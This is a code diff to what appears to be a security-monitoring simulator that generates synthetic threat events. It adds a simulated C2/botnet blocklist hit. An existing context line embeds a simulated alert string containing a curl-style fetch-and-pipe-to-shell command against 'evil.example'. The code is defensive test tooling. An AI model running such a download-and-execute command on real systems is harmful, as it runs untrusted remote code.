@@ -99,6 +99,13 @@ class SimulatorCollector(Collector):
                                 "http://evil.example/x.sh | sh (sim)",
                         tags={"edge", "lolbin", "T1059"}),
                 ])
+            elif roll < 0.978:
+                # Threat intel: la IP atacante está en un feed de C2 conocido.
+                ev = ThreatEvent(
+                    kind="threat_intel_hit", src_ip=ip, severity=Severity.HIGH,
+                    message=f"IP {ip} en blocklist C2/botnet "
+                            f"({random.choice(['feodo', 'sslbl'])}) (sim)",
+                    tags={"threat-intel", "c2"})
             elif roll < 0.985:
                 ev = ThreatEvent(
                     kind="yara_match", severity=Severity.CRITICAL,
